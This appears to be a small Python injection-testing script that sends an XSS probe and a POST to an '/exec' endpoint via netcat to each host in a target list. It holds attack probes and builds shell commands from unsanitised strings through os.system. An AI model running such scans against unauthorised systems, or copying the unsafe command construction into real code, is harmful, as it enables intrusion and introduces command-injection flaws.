import os, random
from memory_engine import get_top_targets

def simulate_injection(ip, port):
    payloads = [
        "GET /?x=<script>alert(1)</script> HTTP/1.1\r\nHost: {}\r\n\r\n",
        "POST /exec HTTP/1.1\r\nHost: {}\r\nContent-Length: 20\r\n\r\nid=__blackice_test__"
    ]
    for p in payloads:
        try:
            print(f"[+] Testing injection vector on {ip}:{port}")
            os.system(f"echo -e \"{p.format(ip)}\" | nc {ip} {port} >/dev/null 2>&1")
        except Exception as e:
            print(f"[!] Injection test failed on {ip}:{port} - {e}")

if __name__ == "__main__":
    for t in get_top_targets():
        ip, port = t.split(":")
        simulate_injection(ip, port)
